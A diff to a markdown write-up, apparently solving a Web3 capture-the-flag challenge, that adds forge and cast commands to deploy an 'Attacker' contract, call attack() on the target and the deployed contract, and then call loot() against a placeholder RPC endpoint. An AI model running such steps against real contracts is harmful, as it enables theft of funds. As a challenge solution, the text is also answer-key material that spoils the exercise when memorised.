@@ -110,6 +110,10 @@ We need to deploy it to distract enemy.
 
 Deploying via `forge`:
 
+```
+forge create src/Attacker.sol:Attacker --rpc-url http://IP:PORT/rpc --private-key $PRIVATE_KEY --constructor-args $TARGET_ADDRESS
+```
+
 ![image](https://github.com/luvranse/web3/assets/46570641/30965871-2205-41cb-8e07-8e7bee8417da)
 
 
@@ -117,13 +121,25 @@ Deploying via `forge`:
 
 Initiate an attack via `cast` with one of our contracts. Distract the enemy.
 
+```
+cast send --rpc-url http://IP:PORT/rpc --private-key $PRIVATE_KEY $TARGET_ADDRESS "attack(uint256)" 1000
+```
+
 ![image](https://github.com/luvranse/web3/assets/46570641/d417621b-9c19-48eb-a161-216f52c0b59b)
 
-Then attack with another one. 
+Then attack with deployed one. 
+
+```
+cast send --rpc-url http://IP:PORT/rpc --private-key $PRIVATE_KEY $DEPLOYED_ADDRESS "attack(uint256)" 1000
+```
 
 ![image](https://github.com/luvranse/web3/assets/46570641/cfe7d15c-dd96-4e7c-a96d-454a2bac6854)
 
 Let's try take a loot. 
+
+```
+cast send --rpc-url http://IP:PORT/rpc --private-key $PRIVATE_KEY $TARGET_ADDRESS "loot()"
+```
 
 ![image](https://github.com/luvranse/web3/assets/46570641/f551402d-c47d-4b4d-87f2-c440b85f9b50)
 
